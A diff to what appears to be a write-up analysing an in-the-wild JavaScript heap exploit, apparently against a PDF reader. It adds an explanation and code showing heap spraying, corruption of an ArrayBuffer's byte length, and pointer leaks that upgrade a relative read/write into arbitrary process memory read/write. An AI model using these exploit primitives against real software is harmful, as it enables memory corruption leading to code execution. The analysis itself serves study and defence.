@@ -191,6 +191,7 @@ var spraynum  = 0x1000;
 var sprayarr  = new Array(spraynum);
 var spraylen  = 0x10000-24;
 var spraybase = 0x0d0e0048;
+var spraypos  = 0x0d0f0058;
 
 // force allocations to prepare the heap for the oob read
 for(var i = 1; i < 0x3000; i++){
@@ -283,12 +284,48 @@ Size: 0x400                 Size: 0x400                  Size: 0x400            
                 biga = new DataView(sprayarr[i+1]);
 
                 ...
-
-                mydv = biga;
-            }
 ```
 
-<p class="cn" markdown="1">Now that they know, which TypedArray has a large size (`if( sprayarr[i].byteLength == 0x20000-24)`), they use it to overwrite the byte length of the adjacent ArrayBuffer (`var biga = new DataView(sprayarr[i]); biga.setUint32(0x10000-12,0x66666666);`). Then they just check that the next ArrayBuffer has a matching byte length (`if(sprayarr[i+1].byteLength == 0x66666666)`) and if it does, then they have a full read/write primitive out of that adjacent ArrayBuffer using a DataView (`biga = new DataView(sprayarr[i+1]);`).</p>
+<p class="cn" markdown="1">Now that they know, which TypedArray has a large size (`if( sprayarr[i].byteLength == 0x20000-24)`), they use it to overwrite the byte length of the adjacent ArrayBuffer (`var biga = new DataView(sprayarr[i]); biga.setUint32(0x10000-12,0x66666666);`). Then they just check that the next ArrayBuffer has a matching byte length (`if(sprayarr[i+1].byteLength == 0x66666666)`) and if it does, then they have a relative read/write out of that adjacent ArrayBuffer using a DataView (`biga = new DataView(sprayarr[i+1]);`).</p>
+
+<p class="cn" markdown="1">At this stage, they need to upgrade this primitive to a full read/write primitive across the whole process space, so they leak a pointer and base address of an Array that hold's TypedArray's.</p>
+
+```
+            var arr = new Array(0x10000);
+            for(var i2 = 0x10; i2 < 0x10000; i2++)
+                arr[i2] = new Uint32Array(1);
+            for(var i2 = 1;i2<0x10;i2++){
+                arr[i2] = new Uint32Array(sprayarr[i+i2]);
+
+                // set the index into the first element of the TypedArray
+                // so that the attackers where they are
+                arr[i2][0] = i2;
+            }
+            
+            for(var i2 = 0x30000; i2 < (0x10000 * 0x10); i2 = i2 + 4)
+            {
+                if( biga.getUint32(i2, true) == spraylen && biga.getUint32(i2 + 4, true) > spraypos ){
+                    
+                    // save a reference to the relative read TypedArray
+                    mydv = biga;
+
+                    // leak the index
+                    var itmp = mydv.getUint32(i2 + 12,true);
+
+                    // get a reference to TypedArray that they can read/write too
+                    myarray = arr1[itmp];
+
+                    // get the pointer of the myarray Array
+                    mypos = biga.getUint32(i2+4,true) - spraypos + 0x50;
+
+                    // set its byte length to a stupid number also
+                    mydv.setUint32(mypos-0x10,0x100000,true);
+
+                    // leak the base of myarray
+                    myarraybase = mydv.getUint32(mypos,true);
+```
+
+<p class="cn" markdown="1">For the full read and write primitives, they write to the Array pointer (`mypos`) the address they want to read/write from, do the read/write and then set the pointer to the Array back to the Array base address.</p>
 
 ```
 function myread(addr){
